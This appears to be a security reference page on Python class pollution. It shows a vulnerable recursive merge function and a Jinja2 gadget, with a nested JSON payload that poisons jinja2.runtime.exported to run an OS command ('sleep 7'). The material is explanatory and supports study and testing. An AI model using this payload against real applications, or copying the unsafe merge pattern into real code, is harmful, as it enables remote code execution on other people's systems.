---
title: "Class Pollution"
description: "Python Class Pollution"
lead: "Python Class Pollution"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "python"
weight: 620
toc: true
---

## Definition

**Class pollution** is a security flaw that enables an attacker to alter class variables. Depending on the available gadgets, this could result in file access or even remote code execution.

## Examples

[Pydash](https://pydash.readthedocs.io/en/latest/) `set_` and `set_with` functions or custom `merge` function:

```python
def merge(source, destination):
    for key, value in source.items():
        if hasattr(destination, "get"):
            if destination.get(key) and type(value) == dict:
                merge(value, destination.get(key))
            else:
                destination[key] = value
        elif hasattr(destination, key) and type(value) == dict:
            merge(value, getattr(destination, key))
        else:
            setattr(destination, key, value)
```

## Gadgets

### Jinja2

#### RCE

- Jinja source code: [https://github.com/pallets/jinja/blob/3.1.2/src/jinja2/compiler.py#L839](https://github.com/pallets/jinja/blob/3.1.2/src/jinja2/compiler.py#L839)

```python
def visit_Template(
    self, node: nodes.Template, frame: t.Optional[Frame] = None
) -> None:
    assert frame is None, "no root frame allowed"
    eval_ctx = EvalContext(self.environment, self.name)

    from .runtime import exported, async_exported

    if self.environment.is_async:
        exported_names = sorted(exported + async_exported)
    else:
        exported_names = sorted(exported)

    self.writeline("from jinja2.runtime import " + ", ".join(exported_names))
```

Payload:

```python
{"__init__":{"__globals__":{"__loader__": {"__init__":{"__globals__":{"sys":{"modules": {"jinja2":{"runtime":{"exported":["*;__import__('os').system('sleep 7');#"]}}}}}}}}}}
```

## References

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [https://ctftime.org/writeup/36082](https://ctftime.org/writeup/36082)